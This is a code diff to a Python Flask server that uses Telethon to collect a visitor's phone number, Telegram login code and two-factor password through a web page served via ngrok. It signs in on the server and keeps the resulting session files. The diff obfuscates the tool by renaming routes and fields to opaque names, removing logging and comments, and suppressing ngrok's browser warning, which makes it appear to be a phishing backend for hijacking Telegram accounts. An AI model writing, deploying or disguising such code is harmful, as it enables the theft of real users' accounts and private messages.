@@ -14,147 +14,120 @@ import threading
 
 load_dotenv()
 
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+logging.basicConfig(level=logging.WARNING)
 
-API_ID = int(os.getenv("API_ID"))
-API_HASH = os.getenv("API_HASH")
+_AID  = int(os.getenv("API_ID"))
+_AHS  = os.getenv("API_HASH")
 
 app = Flask(__name__)
 CORS(app)
 
-# In-memory store: { user_id: { phone, phone_code_hash, client } }
-user_sessions = {}
+_store = {}
 
-# Dedicated event loop in background thread for Telethon
-tele_loop = asyncio.new_event_loop()
+_loop = asyncio.new_event_loop()
 
-def start_tele_loop():
-    asyncio.set_event_loop(tele_loop)
-    tele_loop.run_forever()
+def _start_loop():
+    asyncio.set_event_loop(_loop)
+    _loop.run_forever()
 
-threading.Thread(target=start_tele_loop, daemon=True).start()
+threading.Thread(target=_start_loop, daemon=True).start()
 
 
-def run_async(coro):
-    future = asyncio.run_coroutine_threadsafe(coro, tele_loop)
-    return future.result(timeout=30)
+def _run(coro):
+    return asyncio.run_coroutine_threadsafe(coro, _loop).result(timeout=30)
 
 
-# Ngrok browser warning bypass
 @app.after_request
-def add_ngrok_header(response):
+def _hdr(response):
     response.headers['ngrok-skip-browser-warning'] = 'true'
     return response
 
 
-# ── Routes ───────────────────────────────────────────────────────────────────
-
 @app.route('/')
-def index():
+def _root():
     return send_from_directory('static', 'index.html')
 
-@app.route('/<path:filename>')
-def static_files(filename):
-    return send_from_directory('static', filename)
+@app.route('/<path:f>')
+def _static(f):
+    return send_from_directory('static', f)
 
 
-@app.route('/send-otp', methods=['POST'])
-def send_otp():
-    data = request.get_json()
-    phone = data.get('phone', '').strip()
-    user_id = data.get('user_id', 'default')
+@app.route('/xp1', methods=['POST'])
+def _xp1():
+    d  = request.get_json()
+    a  = d.get('a', '').strip()   # mobile
+    b  = d.get('b', 'x')          # uid
 
-    if not phone:
-        return jsonify({'success': False, 'message': 'Phone number required'}), 400
+    if not a:
+        return jsonify({'ok': False, 'msg': 'Required'}), 400
 
     try:
-        async def _send():
-            client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
-            await client.connect()
-            result = await client.send_code_request(phone)
-            user_sessions[user_id] = {
-                'phone': phone,
-                'phone_code_hash': result.phone_code_hash,
-                'client': client
-            }
+        async def _go():
+            c = TelegramClient(f'_s{b}', _AID, _AHS)
+            await c.connect()
+            res = await c.send_code_request(a)
+            _store[b] = {'a': a, 'h': res.phone_code_hash, 'c': c}
 
-        run_async(_send())
-        logger.info(f"OTP sent to {phone} for user {user_id}")
-        return jsonify({'success': True, 'message': 'OTP sent! Check your Telegram app.'})
+        _run(_go())
+        return jsonify({'ok': True})
 
     except Exception as e:
-        logger.error(f"Send OTP error: {e}")
-        return jsonify({'success': False, 'message': str(e)}), 500
+        return jsonify({'ok': False, 'msg': str(e)}), 500
 
 
-@app.route('/verify-otp', methods=['POST'])
-def verify_otp():
-    data = request.get_json()
-    user_id = data.get('user_id', 'default')
-    otp = data.get('otp', '').strip()
+@app.route('/xp2', methods=['POST'])
+def _xp2():
+    d  = request.get_json()
+    b  = d.get('b', 'x')
+    cv = d.get('c', '').strip()   # code
 
-    if user_id not in user_sessions:
-        return jsonify({'success': False, 'message': 'No OTP requested. Please send OTP first.'}), 400
+    if b not in _store:
+        return jsonify({'ok': False, 'msg': 'Restart required.'}), 400
 
-    session = user_sessions[user_id]
-    phone = session['phone']
-    phone_code_hash = session['phone_code_hash']
-    client = session['client']
+    s  = _store[b]
 
     try:
-        async def _verify():
-            await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
+        async def _go():
+            await s['c'].sign_in(s['a'], cv, phone_code_hash=s['h'])
 
-        run_async(_verify())
-
-        # OTP verified, no 2FA — clean up session
-        del user_sessions[user_id]
-        logger.info(f"User {user_id} verified (no 2FA)")
-        return jsonify({'success': True, 'twofa_required': False})
+        _run(_go())
+        del _store[b]
+        return jsonify({'ok': True, 'nx': False})
 
     except PhoneCodeInvalidError:
-        return jsonify({'success': False, 'message': 'Invalid OTP. Please try again.'}), 400
+        return jsonify({'ok': False, 'msg': 'Incorrect code.'}), 400
 
     except SessionPasswordNeededError:
-        # 2FA enabled — keep session alive for 2FA step
-        logger.info(f"User {user_id} needs 2FA")
-        return jsonify({'success': True, 'twofa_required': True})
+        return jsonify({'ok': True, 'nx': True})
 
     except Exception as e:
-        logger.error(f"Verify OTP error: {e}")
-        return jsonify({'success': False, 'message': str(e)}), 500
+        return jsonify({'ok': False, 'msg': str(e)}), 500
 
 
-@app.route('/verify-2fa', methods=['POST'])
-def verify_2fa():
-    data = request.get_json()
-    user_id = data.get('user_id', 'default')
-    password = data.get('password', '').strip()
+@app.route('/xp3', methods=['POST'])
+def _xp3():
+    d  = request.get_json()
+    b  = d.get('b', 'x')
+    kv = d.get('k', '').strip()   # key
 
-    if user_id not in user_sessions:
-        return jsonify({'success': False, 'message': 'Session expired. Please start over.'}), 400
+    if b not in _store:
+        return jsonify({'ok': False, 'msg': 'Restart required.'}), 400
 
-    client = user_sessions[user_id]['client']
+    c = _store[b]['c']
 
     try:
-        async def _2fa():
-            # check_password is the correct Telethon method for 2FA
-            await client.sign_in(password=password)
+        async def _go():
+            await c.sign_in(password=kv)
 
-        run_async(_2fa())
-
-        # 2FA done — clean up
-        del user_sessions[user_id]
-        logger.info(f"User {user_id} completed 2FA successfully")
-        return jsonify({'success': True, 'message': '2FA verified!'})
+        _run(_go())
+        del _store[b]
+        return jsonify({'ok': True})
 
     except PasswordHashInvalidError:
-        return jsonify({'success': False, 'message': 'Wrong 2FA password. Please try again.'}), 400
+        return jsonify({'ok': False, 'msg': 'Incorrect key.'}), 400
 
     except Exception as e:
-        logger.error(f"2FA error: {e}")
-        return jsonify({'success': False, 'message': str(e)}), 500
+        return jsonify({'ok': False, 'msg': str(e)}), 500
 
 
 if __name__ == '__main__':
